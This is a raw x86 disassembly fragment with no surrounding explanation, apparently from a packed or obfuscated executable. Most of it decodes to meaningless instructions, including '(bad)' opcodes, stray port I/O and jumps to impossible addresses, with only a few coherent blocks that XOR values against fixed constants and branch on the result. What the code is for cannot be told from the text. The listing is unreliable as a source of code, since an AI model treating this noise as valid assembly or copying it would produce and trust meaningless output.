  407cb5:	adc    eax,0x3ff46cce
  407cba:	mov    ds:0xe916c5c3,al
  407cbf:	fild   WORD PTR [edx]
  407cc1:	add    edi,DWORD PTR [esi+edi*2-0x538b41ed]
  407cc8:	dec    BYTE PTR [edx+eiz*2-0x3a]
  407ccc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ccd:	xchg   esp,eax
  407cce:	jno    0x407ccd
  407cd0:	repz xchg edi,eax
  407cd2:	add    DWORD PTR [esi],0xa300c314
  407cd8:	inc    esp
  407cd9:	cwde   
  407cda:	mov    BYTE PTR [ecx+0x19c39222],bh
  407ce0:	dec    edx
  407ce1:	mov    DWORD PTR [ecx+ebx*8+0x25],esp
  407ce5:	(bad)  
  407ce6:	outs   dx,BYTE PTR ds:[esi]
  407ce7:	mov    al,0xc3
  407ce9:	mov    eax,ds:0x398d8e4f
  407cee:	lods   eax,DWORD PTR ds:[esi]
  407cef:	mov    BYTE PTR [edx+0xd],cl
  407cf2:	mov    cl,BYTE PTR [ecx]
  407cf4:	retf   
  407cf5:	push   ss
  407cf6:	pop    esp
  407cf7:	mov    ds:0x58b9c6a5,eax
  407cfc:	dec    esi
  407cfd:	(bad)  
  407cff:	les    edx,FWORD PTR [ebp-0x69e1a2cd]
  407d05:	dec    ebx
  407d06:	sti    
  407d07:	test   DWORD PTR [eax+edi*1],esp
  407d0a:	and    eax,0x109036b2
  407d0f:	pop    ds
  407d10:	jmp    0xedfa:0x93e00c00
  407d17:	mov    cl,BYTE PTR [edi]
  407d19:	push   ebp
  407d1a:	add    DWORD PTR [ecx-0x2a57e082],edx
  407d20:	add    DWORD PTR [ecx],ebx
  407d22:	test   DWORD PTR [eax+ebx*4-0x779d4c75],edi
  407d29:	(bad)  
  407d2a:	cli    
  407d2b:	push   eax
  407d2c:	push   ss
  407d2d:	das    
  407d2e:	mov    dh,dl
  407d30:	jb     0x407d8b
  407d32:	(bad)
  407d37:	lods   eax,DWORD PTR ds:[esi]
  407d38:	pop    ebp
  407d39:	mov    ds:0x4b85955f,eax
  407d3e:	neg    DWORD PTR [edi+0x41]
  407d41:	sbb    DWORD PTR [edx-0x7c],edx
  407d44:	xor    DWORD PTR [ebp-0x67],edi
  407d47:	xor    al,0xc6
  407d49:	add    ah,BYTE PTR [esi+0x69]
  407d4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d4d:	xor    DWORD PTR [ebx],edx
  407d4f:	test   ebx,ebx
  407d51:	xor    ah,BYTE PTR [eax+edi*2-0x555ab3a7]
  407d58:	add    BYTE PTR es:[ecx],0x17
  407d5c:	fwait
  407d5d:	adc    dl,bl
  407d5f:	inc    ebp
  407d60:	push   es
  407d61:	in     eax,0x35
  407d63:	mov    bh,0xcd
  407d65:	loope  0x407dd7
  407d67:	fistp  DWORD PTR [edx+0x2a087f34]
  407d6d:	push   esp
  407d6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d6f:	std    
  407d70:	ins    DWORD PTR es:[edi],dx
  407d71:	outs   dx,BYTE PTR ds:[esi]
  407d72:	aaa    
  407d73:	xchg   esi,eax
  407d74:	rol    DWORD PTR [esi],0x1e
  407d77:	sub    ah,BYTE PTR [eax-0x56]
  407d7a:	les    esp,FWORD PTR [eax]
  407d7c:	sbb    al,0xb7
  407d7e:	nop
  407d7f:	mov    eax,0x56d1562b
  407d84:	(bad)  
  407d85:	sbb    ecx,DWORD PTR [esi-0x5b]
  407d88:	mov    ds:0x257fc547,al
  407d8d:	xor    al,0xd2
  407d8f:	dec    esp
  407d90:	xchg   esi,eax
  407d91:	repz adc esp,DWORD PTR [esp+ebx*1+0x1f6f2a32]
  407d99:	aam    0x67
  407d9b:	jle    0x407d36
  407d9d:	test   eax,0xe19f6b79
  407da2:	jl     0x407da1
  407da4:	mov    esi,0xc30f673c
  407da9:	xor    ecx,DWORD PTR [esi+0x7ee80443]
  407daf:	jl     0x407d51
  407db1:	loope  0x407dd2
  407db3:	inc    ebp
  407db4:	jle    0x407d73
  407db6:	pop    esp
  407db7:	cli    
  407db8:	inc    edx
  407db9:	push   ds
  407dba:	pop    esp
  407dbb:	jnp    0x407e3c
  407dbd:	enter  0x2ddb,0x8b
  407dc1:	ror    DWORD PTR [ebx-0x53f033b3],0xc1
  407dc8:	add    al,cl
  407dca:	loop   0x407dea
  407dcc:	xor    edx,0x40000000
  407dd2:	or     edx,DWORD PTR [ebp-0x64]
  407dd5:	mov    DWORD PTR [ebp-0x30],ecx
  407dd8:	mov    ecx,DWORD PTR [esi]
  407dda:	mov    DWORD PTR [ebp-0x5c],ecx
  407ddd:	shl    DWORD PTR [ebp-0x5c],0x1e
  407de1:	xor    DWORD PTR [ebp-0x5c],0x40000000
  407de8:	mov    DWORD PTR [ebp-0x6c],edx
  407deb:	mov    edx,DWORD PTR [esi+0x4]
  407dee:	mov    edx,DWORD PTR [ebp-0x5c]
  407df1:	xor    ecx,ecx
  407df3:	or     ecx,DWORD PTR [ebp-0x30]
  407df6:	shr    eax,0x2
  407df9:	or     edx,eax
  407dfb:	cmp    ecx,DWORD PTR [ebp-0x70]
  407dfe:	jne    0x4071b0
  407e04:	cmp    edx,DWORD PTR [ebp-0x6c]
  407e07:	je     0x40a9b0
  407e0d:	jmp    0x4071b0
  407e12:	mov    ecx,DWORD PTR [ebx]
  407e14:	mov    eax,DWORD PTR [ebx+0x4]
  407e17:	xor    eax,0x9c1b89e8
  407e1c:	xor    ecx,0xca79a577
  407e22:	shrd   ecx,eax,0x2
  407e26:	shr    eax,0x2
  407e29:	mov    DWORD PTR [ebp-0x6c],eax
  407e2c:	mov    eax,DWORD PTR [ebx]
  407e2e:	mov    edx,DWORD PTR [ebx+0x4]
  407e31:	mov    edx,eax
  407e33:	xor    eax,eax
  407e35:	or     eax,ecx
  407e37:	shl    edx,0x1e
  407e3a:	xor    edx,0x40000000
  407e40:	or     edx,DWORD PTR [ebp-0x6c]
  407e43:	mov    DWORD PTR [ebp-0x68],eax
  407e46:	mov    eax,DWORD PTR [esi]
  407e48:	xor    eax,0xca79a577
  407e4d:	mov    DWORD PTR [ebp+0x14],eax
  407e50:	mov    DWORD PTR [ebp-0x64],edx
  407e53:	mov    edx,DWORD PTR [esi+0x4]
  407e56:	mov    ecx,0x9c1b89e8
  407e5b:	xor    edx,ecx
  407e5d:	mov    eax,edx
  407e5f:	mov    edx,DWORD PTR [ebp+0x14]
  407e62:	shrd   edx,eax,0x2
  407e66:	shr    eax,0x2
  407e69:	jmp    0x408247
  407e6e:	push   ss
  407e6f:	dec    esi
  407e70:	dec    ecx
  407e71:	test   BYTE PTR [eax-0x22],0x27
  407e75:	cs aam 0xd8
  407e78:	sbb    eax,0xeb76487e
  407e7d:	mov    esi,0x18186f22
  407e82:	sahf   
  407e83:	adc    bl,BYTE PTR [eax]
  407e85:	sbb    BYTE PTR [eax],al
  407e87:	data16 addr16 clc 
  407e8a:	(bad)  
  407e8b:	pop    edx
  407e8c:	lds    ebx,FWORD PTR [edi]
  407e8e:	pop    eax
  407e8f:	mov    edx,DWORD PTR [ecx-0x6d]
  407e92:	rcr    DWORD PTR [eax+0x5a],0x2c
  407e96:	inc    eax
  407e97:	push   ebp
  407e98:	sbb    DWORD PTR [eax+0x69],eax
  407e9b:	daa    
  407e9c:	mov    DWORD PTR [edi-0x1727d79c],ebx
  407ea2:	add    BYTE PTR [edi],ah
  407ea4:	sub    BYTE PTR [ebx+ecx*4-0x4134bf66],al
  407eab:	stos   DWORD PTR es:[edi],eax
  407eac:	pusha  
  407ead:	mov    esp,esi
  407eaf:	or     ch,BYTE PTR [ebp+eiz*8+0x58]
  407eb3:	sbb    ch,BYTE PTR [ebx]
  407eb5:	ins    BYTE PTR es:[edi],dx
  407eb6:	retf   
  407eb7:	ror    DWORD PTR [eax+0x4f58e039],1
  407ebd:	loope  0x407f22
  407ebf:	fstp   TBYTE PTR [ebp+0x6759c2ee]
  407ec5:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  407ec7:	ffreep st(3)
  407ec9:	cmp    al,0x7e
  407ecb:	add    al,0x46
  407ecd:	add    BYTE PTR [ebx-0x3b5f54f3],bh
  407ed3:	cmp    BYTE PTR [eax],0xf3
  407ed6:	outs   dx,DWORD PTR ds:[esi]
  407ed7:	leave  
  407ed8:	xchg   esi,eax
  407ed9:	and    BYTE PTR [ecx-0x4c0e6505],ch
  407edf:	ret    
  407ee0:	fdivr  DWORD PTR [ecx-0x67]
  407ee3:	mov    bh,0xae
  407ee5:	pop    ds
  407ee6:	sbb    ecx,ebp
  407ee8:	mov    ebx,0x9baa2a3a
  407eed:	out    dx,al
  407eee:	ret    
  407eef:	xchg   ebx,eax
  407ef0:	sub    DWORD PTR [eax-0x48],ebx
  407ef3:	xor    al,0xe2
  407ef5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ef6:	pop    edi
  407ef7:	clc    
  407ef8:	push   ebp
  407ef9:	enter  0x338c,0x85
  407efd:	lock sbb al,0x5c
  407f00:	outs   dx,BYTE PTR ds:[esi]
  407f01:	mov    ds:0x91b444b8,eax
  407f06:	stc    
  407f07:	push   edx
  407f08:	fidiv  WORD PTR [edx+0x45]
  407f0b:	mov    esi,0x29b1e952
  407f10:	dec    eax
  407f11:	pop    edx
  407f12:	jo     0x407eaf
  407f14:	fxch   st(1)
  407f16:	fidivr DWORD PTR [edx-0x2]
  407f19:	push   ebx
  407f1a:	dec    ebx
  407f1b:	aas    
  407f1c:	xchg   edx,eax
  407f1d:	push   esp
  407f1e:	in     al,dx
  407f1f:	lds    ebp,FWORD PTR [di-0x7edf]
  407f24:	inc    edi
  407f25:	fs add al,0x1f
  407f28:	fisttp DWORD PTR [edx+0x37]
  407f2b:	mov    BYTE PTR [eax+0x14f08339],ah
  407f31:	sub    al,0x73
  407f33:	ss jns 0x407f9b
  407f36:	adc    edx,esp
  407f38:	ret    0x10ce
  407f3b:	mov    WORD PTR [eax],cs
  407f3d:	out    0xb9,eax
  407f3f:	cmp    DWORD PTR [ecx-0x78],0xab21b30e
  407f46:	sub    ebp,DWORD PTR [ebp+0x72]
  407f49:	std    
  407f4a:	adc    eax,0x74f793c6
  407f4f:	out    0x82,al
  407f51:	sub    al,0x4e
  407f53:	fwait
  407f54:	sbb    BYTE PTR [edx+esi*1],dl
  407f57:	jmp    0x407fd4
  407f59:	mov    dl,0x4e
  407f5b:	sub    al,0xf5
  407f5d:	pop    ds
  407f5e:	aad    0x6f
  407f60:	mov    DWORD PTR [ebx+0x11],edi
  407f63:	cmp    BYTE PTR ds:0x3f833de9,cl
  407f69:	dec    eax
  407f6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f6b:	ror    DWORD PTR [esp+ebp*8-0x5e],0x5f
  407f70:	and    ebp,ebx
  407f72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f73:	jge    0x407fde
  407f75:	xor    edx,DWORD PTR [esi]
  407f77:	jae    0x407fe9
  407f79:	aad    0x99
  407f7b:	pop    eax
  407f7c:	pop    ds
  407f7d:	sahf   
  407f7e:	xchg   esi,eax
  407f7f:	(bad)  
  407f80:	sar    BYTE PTR [esi],cl
  407f82:	inc    ebx
  407f83:	jno    0x407f8b
  407f85:	jne    0x407fb2
  407f87:	push   0x6d
  407f89:	ja     0x407f68
  407f8b:	fld    DWORD PTR [esi]
  407f8d:	out    dx,eax
  407f8e:	xor    dl,ch
  407f90:	out    dx,al
  407f91:	test   eax,0x7aff4159
  407f96:	adc    bh,BYTE PTR [ecx-0x5079cd58]
  407f9c:	add    esp,DWORD PTR [ecx]
  407f9e:	scas   eax,DWORD PTR es:[edi]
  407f9f:	out    dx,al
  407fa0:	add    esp,DWORD PTR [ecx+0x54d0d2fc]
  407fa6:	xor    ch,BYTE PTR [esp+ebp*2+0x32]
  407faa:	mov    ebx,0x8713dfd
  407faf:	and    al,BYTE PTR [ebp+0x54a7ebee]
  407fb5:	mov    dh,0x74
  407fb7:	pushf  
  407fb8:	adc    ecx,esp
  407fba:	mov    ch,0x88
  407fbc:	xchg   ebp,eax
  407fbd:	push   cs
  407fbe:	pop    ecx
  407fbf:	inc    eax
  407fc0:	nop
  407fc1:	stc    
  407fc2:	inc    edi
  407fc3:	fcomp  QWORD PTR [eax]
  407fc5:	mov    eax,0x27f1da68
  407fca:	fld    QWORD PTR [edi-0x1df3f701]
  407fd0:	inc    edx
  407fd1:	stc    
  407fd2:	or     edi,esi
  407fd4:	in     eax,0x3
  407fd6:	pop    esi
  407fd7:	cmp    DWORD PTR [edi],0xffffffd0
  407fda:	adc    eax,0x6ee5ed59
  407fdf:	jl     0x407f6b
  407fe1:	mov    edi,0xfdfda28f
  407fe6:	or     DWORD PTR [esi+0x58],edi
  407fe9:	inc    ebx
  407fea:	push   eax
  407feb:	cli    
  407fec:	js     0x407f7b
  407fee:	in     eax,0xd7
  407ff0:	and    eax,0x32f28009
  407ff5:	jne    0x407f89
  407ff7:	out    0xce,eax
  407ff9:	ret    
  407ffa:	push   esp
  407ffb:	mov    ah,0x2d
  407ffd:	pop    edi
  407ffe:	jmp    0x407fb0
  408000:	fisttp WORD PTR [ebp-0x63c9c6e5]
  408006:	stos   BYTE PTR es:[edi],al
  408007:	pushf  
  408008:	xchg   cl,ch
  40800a:	sbb    esi,edx
  40800c:	dec    esp
  40800d:	cmp    eax,0xf0d38ba1
  408012:	jae    0x408002
  408014:	call   0x43042b8a
  408019:	call   0xdb48f24c
  40801e:	jmp    0x40802b
  408020:	xchg   esi,eax
  408021:	test   BYTE PTR [esi],0xed
  408024:	(bad)  
  408025:	cs in  al,0x19
  408028:	inc    esp
  408029:	aaa    
  40802a:	fist   WORD PTR fs:[ebp+0x13]
  40802e:	cmp    eax,0xbaf4ce51
  408033:	aam    0xd5
  408035:	mov    ah,0x8d
  408037:	stos   BYTE PTR es:[edi],al
  408038:	aaa    
  408039:	cli    
  40803a:	leave  
  40803b:	test   esi,edx
  40803d:	cmp    ebx,ebx
  40803f:	xchg   DWORD PTR [esi-0x53],edi
  408042:	mov    gs,WORD PTR [esp+esi*1-0x56bebe76]
  408049:	xor    dl,BYTE PTR [ecx]
  40804b:	or     bl,BYTE PTR [edx-0xddf8716]
  408051:	xor    DWORD PTR ds:0x62ecff32,esp
  408057:	and    BYTE PTR [esi+edx*2],dh
  40805a:	iret   
  40805b:	shl    BYTE PTR [esp+ebp*2],cl
  40805e:	retf   0x40cf
  408061:	inc    DWORD PTR [edx+0x47]
  408064:	(bad)  
  408065:	ffree  st(6)
  408067:	mov    cl,0x36
  408069:	jno    0x4080bf
  40806b:	lds    ebx,FWORD PTR [esi]
  40806d:	mov    BYTE PTR [ebx+0x63221e11],dh
  408073:	or     BYTE PTR [eax+0x41],0xed
  408077:	outs   dx,DWORD PTR ds:[esi]
  408078:	push   es
  408079:	test   BYTE PTR [ebx+0x44d3df35],ah
  40807f:	jno    0x408039
  408081:	jnp    0x408024
  408083:	mov    ebp,0x9f5cd814
  408088:	mov    BYTE PTR [edi+0x59577eb0],0xfd
  40808f:	leave  
  408090:	sbb    edi,ebp
  408092:	push   cs
  408093:	sub    al,0x2a
  408095:	adc    dl,BYTE PTR [esi]
  408097:	xor    eax,0xd1cde253
  40809c:	pop    edx
  40809d:	or     eax,0x792df1fe
  4080a2:	sahf   
  4080a3:	and    BYTE PTR [edi+0x6e],0x1b
  4080a7:	mov    BYTE PTR [esi-0x7397876e],bl
  4080ad:	sahf   
  4080ae:	ins    BYTE PTR es:[edi],dx
  4080af:	lea    eax,[ebp-0x28e118d8]
  4080b5:	pop    ebp
  4080b6:	push   ss
  4080b7:	sub    BYTE PTR [esi+0x30],0x84
  4080bb:	inc    edi
  4080bc:	test   al,0x4f
  4080be:	mov    cl,0xe4
  4080c0:	pop    edx
  4080c1:	mov    ds:0xef7087a7,al
  4080c6:	sti    
  4080c7:	inc    eax
  4080c8:	or     al,0x38
  4080ca:	fiadd  DWORD PTR [ebx+0x56]
  4080cd:	scas   al,BYTE PTR es:[edi]
  4080ce:	out    dx,eax
  4080cf:	mov    esp,0x401f1bce
  4080d4:	jmp    0x4dfa:0x87e671f
  4080db:	outs   dx,BYTE PTR ds:[esi]
  4080dc:	add    BYTE PTR [esi],cl
  4080de:	out    dx,eax
  4080df:	mov    cl,0x59
  4080e1:	fwait
  4080e2:	adc    ah,dh
  4080e4:	jmp    0x7e18690a
  4080e9:	cmc    
  4080ea:	jle    0x4080dd
  4080ec:	xor    esp,DWORD PTR [ebx+0x2f72ab1]
  4080f2:	ret    0x38c9
  4080f5:	and    ch,BYTE PTR [edx-0x68]
  4080f8:	call   0x1fe2:0x22a7c914
  4080ff:	test   ebx,ebx
  408101:	mov    DWORD PTR [ecx-0x421eb308],ecx
  408107:	shl    cl,0xbd
  40810a:	fld    QWORD PTR ds:0x2f9e17a4
  408110:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408111:	mov    ebx,0x2ccf31ad
  408116:	(bad)  
  408117:	jmp    DWORD PTR [ebx+0x7e]
  40811a:	test   al,0x24
  40811c:	cmp    ebp,DWORD PTR [edx]
  40811e:	add    DWORD PTR [edi*1-0x75cb3be7],esp
  408125:	cs jl  0x40810b
  408128:	sbb    DWORD PTR [edi],ebp
  40812a:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40812c:	and    eax,DWORD PTR [ebx+0x48668a6b]
  408132:	shr    BYTE PTR [esi],0x86
  408135:	adc    DWORD PTR ds:[edx-0x80],ecx
  408139:	sahf   
  40813a:	xor    BYTE PTR [ecx],al
  40813c:	je     0x40817c
  40813e:	pushf  
  40813f:	jno    0x40819d
  408141:	fnsave [edx]
  408143:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408144:	call   0xc29:0xb3631b3
  40814b:	xchg   ebx,eax
  40814c:	lock jmp 0x3a6e7ce7
  408152:	mov    esi,0xa391aa80
  408157:	jno    0x408143
  408159:	imul   ebx,ebp,0xffffff84
  40815c:	and    al,0xaa
  40815e:	mov    eax,0x1113d466
  408163:	fldcw  WORD PTR [ebp+0xb1414a1]
  408169:	ficom  DWORD PTR [esi-0x56]
  40816c:	fisub  DWORD PTR [eax+esi*4-0x783225da]
  408173:	xchg   esi,eax
  408174:	aam    0xd7
  408176:	and    al,0x8c
  408178:	iret   
  408179:	mov    eax,0x1181b6e3
  40817e:	sbb    DWORD PTR [ebp+ebp*8-0xbaa4968],ebx
  408185:	cli    
  408186:	lds    ecx,FWORD PTR [ecx]
  408188:	repnz int3 
  40818a:	shr    BYTE PTR gs:[ebx],cl
  40818d:	(bad)  
  40818e:	jmp    DWORD PTR [esi]
  408190:	and    eax,0xe9ec6366
  408195:	shr    BYTE PTR [esi-0xe],0x94
  408199:	pop    ecx
  40819a:	and    ebx,DWORD PTR [ebx]
  40819c:	and    edx,edi
  40819e:	pminsw mm7,mm0
  4081a1:	add    DWORD PTR [esi],ebp
  4081a3:	or     al,ch
  4081a5:	mov    BYTE PTR [eax+0x77bc8e0],bl
  4081ab:	jmp    0xc3f9:0x9baf133e
  4081b2:	test   DWORD PTR [ecx+0x656a89db],eax
  4081b8:	pop    ecx
  4081b9:	nop
  4081ba:	fadd   QWORD PTR [esi+0x66]
  4081bd:	loop   0x4081bf
  4081bf:	popa   
  4081c0:	leave  
  4081c1:	inc    ecx
  4081c2:	pop    edi
  4081c3:	fnstenv [esi+eiz*1-0x6c]
  4081c7:	cmp    ch,cl
  4081c9:	mov    al,ds:0x3d0d8f9b
  4081ce:	repnz cdq 
  4081d0:	pop    ecx
  4081d1:	xchg   esp,esi
  4081d3:	pusha  
  4081d4:	jbe    0x408177
  4081d6:	push   eax
  4081d7:	repnz gs xchg edx,eax
  4081da:	sti    
  4081db:	shl    ch,cl
  4081dd:	loope  0x408161
  4081df:	xor    eax,DWORD PTR [eax-0x5c]
  4081e2:	pop    ds
  4081e3:	lds    ebp,FWORD PTR ds:0xbca287e6
  4081e9:	jge    0x408237
  4081eb:	push   ebx
  4081ec:	push   edi
  4081ed:	cli    
  4081ee:	mov    edx,0x60469a6f
  4081f3:	jo     0x40825d
  4081f5:	adc    al,0x78
  4081f7:	movnti DWORD PTR [ecx+0x5c8f3f63],ecx
  4081fe:	push   ebx
  4081ff:	add    DWORD PTR [edi+esi*2],0x4416616c
  408206:	aaa    
  408207:	jbe    0x4081a6
  408209:	add    ebx,DWORD PTR [esi+0x23]
  40820c:	out    0xef,al
  40820e:	(bad)  
  40820f:	pop    esi
  408210:	sub    DWORD PTR [eax-0x46],ecx
  408213:	stos   BYTE PTR es:[edi],al
  408214:	retf   0xb945
  408217:	mov    ds:0x96188ea2,eax
  40821c:	rol    BYTE PTR [eax-0x68aa4c71],0x42
  408223:	leave  
  408224:	je     0x408222
  408226:	mov    ds:0x2c5e6de1,eax
  40822b:	push   cs
  40822c:	mov    ds:0x79666933,eax
  408231:	aad    0x96
  408233:	sub    eax,0x45845617
  408238:	lds    edx,FWORD PTR [ecx+edi*4]
  40823b:	jecxz  0x4081c0
  40823d:	jo     0x40829e
  40823f:	nop
  408240:	sub    bh,BYTE PTR [ecx+0x3f]
  408243:	je     0x4082b2
  408245:	xor    cl,BYTE PTR [eax-0x746bba77]
  40824b:	push   es
  40824c:	mov    DWORD PTR [ebp+0x14],eax
  40824f:	shl    DWORD PTR [ebp+0x14],0x1e
  408253:	xor    DWORD PTR [ebp+0x14],0x40000000
  40825a:	xor    eax,eax
  40825c:	mov    DWORD PTR [ebp-0x70],edx
  40825f:	or     eax,DWORD PTR [ebp-0x70]
  408262:	mov    edx,DWORD PTR [esi+0x4]
  408265:	mov    DWORD PTR [ebp-0x60],eax
  408268:	mov    eax,DWORD PTR [ebp+0x14]
  40826b:	or     eax,DWORD PTR [ebp-0x6c]
  40826e:	mov    DWORD PTR [ebp-0x5c],eax
  408271:	mov    eax,DWORD PTR [ebp-0x68]
  408274:	cmp    DWORD PTR [ebp-0x60],eax
  408277:	jmp    0x408655
  40827c:	xchg   edx,eax
  40827d:	hlt    
  40827e:	xchg   ebp,eax
  40827f:	addr16 jb 0x4082e9
  408282:	(bad)  
  408283:	in     al,0x70
  408285:	mov    edx,0x232d709d
  40828a:	xchg   ecx,eax
  40828b:	jo     0x408235
  40828d:	sbb    BYTE PTR [bx+si],bl
  408290:	sahf   
  408291:	adc    bl,BYTE PTR [eax]
  408293:	sbb    BYTE PTR [edi],ch
  408295:	xor    ebp,ebx
  408297:	cs push ds
  408299:	in     al,0x7b
  40829b:	imul   ebp,DWORD PTR [ecx+0x6e],0x6c
  40829f:	scas   al,BYTE PTR es:[edi]
  4082a0:	jo     0x408229
  4082a2:	mov    BYTE PTR [edi+0x5b3c52bc],dh
  4082a8:	fldcw  WORD PTR [ecx]
  4082aa:	ja     0x408289
  4082ac:	mov    dh,0x33
  4082ae:	inc    esi
  4082af:	mov    ecx,0x5d5844a7
  4082b4:	and    ch,BYTE PTR [edx]
  4082b6:	int3   
  4082b7:	xchg   esp,eax
  4082b8:	push   ss
  4082b9:	pop    edx
  4082ba:	xchg   edx,eax
  4082bb:	push   es
  4082bc:	(bad)  
  4082bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082be:	mov    DWORD PTR [ecx-0x47],0x2027316
  4082c5:	imul   esi,DWORD PTR [esi-0x3b],0x68096a30
  4082cc:	imul   ebp,DWORD PTR [edi-0x7cd07447],0xffffffd8
  4082d3:	mov    edi,0x1a3e2c0d
  4082d8:	push   edi
  4082d9:	das    
  4082da:	lahf   
  4082db:	hlt    
  4082dc:	sub    al,0x4e
  4082de:	push   eax
  4082df:	aaa    
  4082e0:	fld    DWORD PTR [eax+0x6a]
  4082e3:	or     edx,DWORD PTR [edx+0x1d84d233]
  4082e9:	mov    al,0x7e
  4082eb:	retf   0xf218
  4082ee:	xor    DWORD PTR [ecx-0x3d],edx
  4082f1:	dec    esi
  4082f2:	jno    0x4082a8
  4082f4:	ins    DWORD PTR es:[edi],dx
  4082f5:	popa   
  4082f6:	jle    0x40827f
  4082f8:	fdivr  st,st(2)
  4082fa:	adc    BYTE PTR [ecx-0x7d],al
  4082fd:	xchg   DWORD PTR [eax+0x29565493],edi
  408303:	data16 vpsubsb xmm5,xmm4,xmm5
  408308:	js     0x40828d
  40830a:	mov    ds:0x3e397797,eax
  40830f:	(bad)  
  408310:	lods   eax,DWORD PTR ds:[esi]
  408311:	jae    0x408316
  408313:	sub    edi,ecx
  408315:	lds    eax,FWORD PTR [edi]
  408317:	stos   BYTE PTR es:[edi],al
  408318:	into   
  408319:	jo     0x408327
  40831b:	push   ss
  40831c:	xor    al,0x7f
  40831e:	adc    eax,0x88fa02d9
  408323:	jmp    0x52d96f08
  408328:	fwait
  408329:	cmp    bp,WORD PTR [eax+0x3928c0c2]
  408330:	inc    ecx
  408331:	mov    ah,BYTE PTR [esi-0x5]
  408334:	adc    ah,BYTE PTR [ebp-0x73ffc187]
  40833a:	(bad)  
  40833b:	jns    0x408328
  40833d:	in     al,0x6d
  40833f:	xchg   BYTE PTR [ebp-0x18],cl
  408342:	dec    ebp
  408343:	mov    ebp,0x68534fd2
  408348:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408349:	mov    bl,BYTE PTR [ebp+0x52]
  40834c:	iret   
  40834d:	mov    cs,WORD PTR [ebp+0x455ecf82]
  408353:	test   al,0x5
  408355:	dec    ebp
  408356:	into   
  408357:	push   cs
  408358:	and    al,0xf9
  40835a:	push   cs
  40835b:	adc    ch,BYTE PTR [ebx+0x56fe098e]
  408361:	iret   
  408362:	sbb    ebx,DWORD PTR [eax]
  408364:	rcl    BYTE PTR [eax],0x9e
  408367:	or     DWORD PTR [ebx],0x33
  40836a:	xchg   BYTE PTR [eax],dh
  40836c:	sti    
  40836d:	ds (bad) 
  40836f:	ja     0x40834f
  408371:	add    eax,DWORD PTR [eax]
  408373:	xchg   ebx,eax
  408374:	leave  
  408375:	ins    DWORD PTR es:[edi],dx
  408376:	sub    eax,0x1ca1b3fc
  40837b:	sub    esi,DWORD PTR [eax-0xc386c84]
  408381:	push   esp
  408382:	js     0x408365
  408384:	rcr    DWORD PTR [eax+0x6f],1
  408387:	cmp    eax,0x88116a7e
  40838c:	std    
  40838d:	test   edi,ebp
  40838f:	pop    ss
  408390:	mov    esp,0xb224179a
  408395:	out    dx,al
  408396:	and    ebp,DWORD PTR [eax]
  408398:	neg    ebp
  40839a:	icebp  
  40839b:	test   BYTE PTR [edx+0x5368b4de],0x4
  4083a2:	sti    
  4083a3:	fimul  WORD PTR [eax+0x4d771ec6]
  4083a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083aa:	hlt    
  4083ab:	jne    0x408382
  4083ad:	in     eax,dx
  4083ae:	lds    ebx,FWORD PTR [esi]
  4083b0:	and    edx,DWORD PTR [edi+0x53b50a7f]
  4083b6:	or     BYTE PTR [edi+0x4bac3614],ch
  4083bc:	pusha  
  4083bd:	mov    dh,0x96
  4083bf:	and    DWORD PTR [ecx],eax
  4083c1:	and    ah,BYTE PTR [ecx+0x5651d1cf]
  4083c7:	push   ds
  4083c8:	mov    DWORD PTR [ecx-0x72],ebp
  4083cb:	pop    es
  4083cc:	mov    edi,0x28c68dc9
  4083d1:	pop    ebx
  4083d2:	jecxz  0x408354
  4083d4:	int3   
  4083d5:	add    BYTE PTR ds:0x257872f8,bl
  4083db:	fsub   st(6),st
  4083dd:	xchg   edx,eax
  4083de:	stos   DWORD PTR es:[edi],eax
  4083df:	in     eax,dx
  4083e0:	xor    eax,0x38fa8efb
  4083e5:	inc    ecx
  4083e6:	loop   0x4083ec
  4083e8:	(bad)  
  4083ea:	(bad)  
  4083eb:	addr16 adc eax,0x34af6892
  4083f1:	fwait
  4083f2:	in     eax,dx
  4083f3:	rcr    bl,cl
  4083f5:	enter  0x90b8,0x3
  4083f9:	inc    edx
  4083fa:	mov    al,0x73
  4083fc:	xlat   BYTE PTR ds:[ebx]
  4083fd:	pop    edx
  4083fe:	loop   0x4083c1
  408400:	dec    ebp
  408401:	lahf   
  408402:	dec    edx
  408403:	sbb    ch,BYTE PTR [esi+0x266b5e46]
  408409:	in     eax,0x8c
  40840b:	into   
  40840c:	jl     0x4083c1
  40840e:	not    edi
  408410:	mov    al,0xd8
  408412:	icebp  
  408413:	mov    es:0x24989932,eax
  408419:	mov    ds:0x81b40ed,al
  40841e:	mov    ds:0x7a9a8cb8,eax
  408423:	psubb  mm5,QWORD PTR [edi+0x2238017e]
  40842a:	nop
  40842b:	xchg   ebx,eax
  40842c:	pop    esp
  40842d:	into   
  40842e:	pop    eax
  40842f:	xlat   BYTE PTR ds:[ebx]
  408430:	bswap  edx
  408432:	data16 sbb dh,BYTE PTR [esi]
  408435:	pop    ds
  408436:	jae    0x4083e0
  408438:	jecxz  0x40846c
  40843a:	stos   BYTE PTR es:[edi],al
  40843b:	adc    ah,ch
  40843d:	push   ecx
  40843e:	mov    ch,0x7d
  408440:	xchg   ebp,eax
  408441:	(bad)  
  408443:	cwde   
  408444:	sub    eax,0x36687032
  408449:	or     edx,DWORD PTR [edi+0x23]
  40844c:	je     0x4083ed
  40844e:	scas   al,BYTE PTR es:[edi]
  40844f:	dec    edx
  408450:	fdiv   DWORD PTR [eax]
  408452:	scas   al,BYTE PTR es:[edi]
  408453:	jp     0x408468
  408455:	adc    ch,ch
  408457:	stos   DWORD PTR es:[edi],eax
  408458:	mov    bh,0xf9
  40845a:	pusha  
  40845b:	arpl   WORD PTR [esi-0x3],di
  40845e:	and    esi,DWORD PTR [esi+0x27]
  408461:	push   edi
  408462:	push   ss
  408463:	pop    esp
  408464:	imul   ecx,DWORD PTR [edx-0x64],0x5295fdbd
